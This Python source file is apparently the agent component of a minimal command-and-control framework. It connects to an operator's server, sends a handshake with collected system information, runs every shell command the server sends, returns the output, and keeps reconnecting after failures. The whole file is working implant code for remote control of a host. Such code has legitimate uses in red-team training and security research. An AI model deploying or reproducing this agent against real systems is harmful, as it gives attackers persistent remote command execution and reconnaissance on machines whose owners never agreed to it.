#!/usr/bin/env python3
"""
Minimal C2 agent.

Usage:
    python -m c2.agent.main --host 127.0.0.1 --port 9001
"""

import argparse
import socket
import time
import uuid
import sys
from typing import Tuple

from c2.server.transport import send_message, recv_message
from c2.agent.protocol import make_handshake
from c2.server.protocol import TYPE_EXEC, TYPE_EXEC_RESULT
from c2.agent.executor import run_command
from c2.agent.sysinfo import collect

RETRY_SECONDS = 3
RECV_POLL_TIMEOUT = 0.1  # not required by the transport but left for future use


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="C2 agent")
    p.add_argument("--host", "-H", required=True, help="Server IP or hostname")
    p.add_argument("--port", "-p", type=int, required=True, help="Server port")
    p.add_argument("--retry", "-r", type=int, default=RETRY_SECONDS, help="Seconds to wait before reconnect")
    return p.parse_args()


def make_agent_payload(sock: socket.socket, agent_id: str) -> dict:
    """
    Build handshake payload using sysinfo.collect.
    collect(addr: str, agent_id: str) expected signature in this repository.
    """
    # obtain local socket IP for sysinfo context
    try:
        local_addr = sock.getsockname()[0]
    except Exception:
        local_addr = "0.0.0.0"

    info = collect()
    # include an explicit id field to match server model expectations
    payload = {"id": agent_id, **info}
    return payload


def handle_exec_message(msg: dict) -> Tuple[str, str, int]:
    """
    Run the requested command and return stdout, stderr, exit_code.
    """
    cmd = msg.get("payload", {}).get("cmd", "")
    if not cmd:
        return "", "no command provided", 1
    out, err, code = run_command(cmd)
    return out, err, code


def connect_and_run(server_host: str, server_port: int, retry_seconds: int) -> None:
    """
    Connect to server, send handshake, then listen for exec commands.
    This function loops forever until interrupted.
    """
    while True:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((server_host, server_port))

            # create stable agent id for this connection
            agent_id = str(uuid.uuid4())

            # handshake
            payload = make_agent_payload(s, agent_id)
            send_message(s, make_handshake(payload))

            # main receive loop
            while True:
                msg = recv_message(s)
                # transport raises exceptions on EOF/invalid, but defend anyway
                if msg is None:
                    break

                if msg.get("type") == TYPE_EXEC:
                    stdout, stderr, exit_code = handle_exec_message(msg)

                    # respond using the keys the server expects: stdout, stderr, code
                    resp = {
                        "type": TYPE_EXEC_RESULT,
                        "payload": {
                            "stdout": stdout,
                            "stderr": stderr,
                            "code": exit_code
                        }
                    }
                    send_message(s, resp)

        except KeyboardInterrupt:
            # graceful shutdown requested by user
            try:
                if s:
                    s.close()
            except Exception:
                pass
            print("Agent interrupted, exiting.")
            sys.exit(0)
        except Exception as e:
            # transient error: print minimal info and retry after delay
            print(f"[!] Connection error: {e}. Retrying in {retry_seconds}s...", file=sys.stderr)
            try:
                if s:
                    s.close()
            except Exception:
                pass
            time.sleep(retry_seconds)
            continue


def main() -> None:
    args = parse_args()
    connect_and_run(args.host, args.port, args.retry)


if __name__ == "__main__":
    main()
